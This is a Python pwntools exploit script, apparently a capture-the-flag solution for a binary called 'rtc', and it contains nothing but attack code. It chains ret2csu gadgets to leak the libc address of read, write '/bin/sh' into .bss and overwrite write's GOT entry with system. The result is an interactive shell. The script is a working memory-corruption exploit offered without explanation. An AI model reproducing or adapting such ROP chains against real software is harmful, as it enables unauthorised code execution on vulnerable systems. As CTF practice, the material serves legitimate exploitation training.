from pwn import *

context.log_level = "DEBUG"
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#p = process(["./rtc"], env={'LD_PRELOAD':'/mnt/d/CTF/hackctf/rtc/libc.libc.so.6'})
p = process("./rtc")
#p = remote("ctf.j0n9hyun.xyz", 3025)
e = ELF("./rtc")
libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
gdb.attach(p, "b*0x4006A9")

read_plt = e.plt['read']
read_got = e.got['read']
read_offset = libc.symbols['read']
write_plt = e.plt['write']
write_got = e.got['write']
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
main = e.symbols['main']
bss = 0x601060
binsh = "/bin/sh\x00"

log.info("read_offset : "+hex(read_offset))
log.info("write_offset : "+hex(write_offset))


csu_init = 0x4006ba
csu_call = 0x4006a0
pop_rdi = 0x4006c3
pop_rsi_offset = 0x202e8
# rbx rbp r12   r13  r14  r15
#  0   1  func  3rd  2bd  1st

print p.recvuntil("Hey, ROP! What's Up?\n")

# csu_call(write(1, read_got, 8) read_got  Leak
payload = ''
payload += "A"*72
payload += p64(csu_init)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(write_got) # r12
payload += p64(8) # r13
payload += p64(read_got) # r14
payload += p64(1) # r15
payload += p64(csu_call)

# csu_call(read(0, bss+8, 8) input /bin/sh addr
payload += p64(csu_init) # rsp + 8
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(read_got) # r12
payload += p64(len(binsh)) # r13
payload += p64(bss) # r14
payload += p64(0) # r15
payload += p64(csu_call)

#  csu_call(read(0, write_got, 8) got_overwirte in write
payload += p64(csu_init) # rsp + 8
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(read_got) # r12
payload += p64(8) # r13
payload += p64(write_got) # r14
payload += p64(0) # r15
payload += p64(csu_call)

# rbx rbp r12   r13  r14  r15
#  0   1  func  3rd  2bd  1st
# csu_call(write(bss)) execute write
payload += p64(csu_init) # rsp + 8
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(write_got) # r12
payload += p64(0) # r13
payload += p64(0) # r14
payload += p64(bss) # r15
payload += p64(csu_call)

p.send(payload)

read_addr = u64(p.recv(8).ljust(8,'\x00'))
libc_base = read_addr - read_offset
system = libc_base + system_offset
pop_rsi = libc_base + pop_rsi_offset
log.info("read_addr : "+hex(read_addr))
log.info("libc_base : "+hex(libc_base))
log.info("system() : "+hex(system))


p.send(binsh)
p.send(p64(system))
p.interactive()
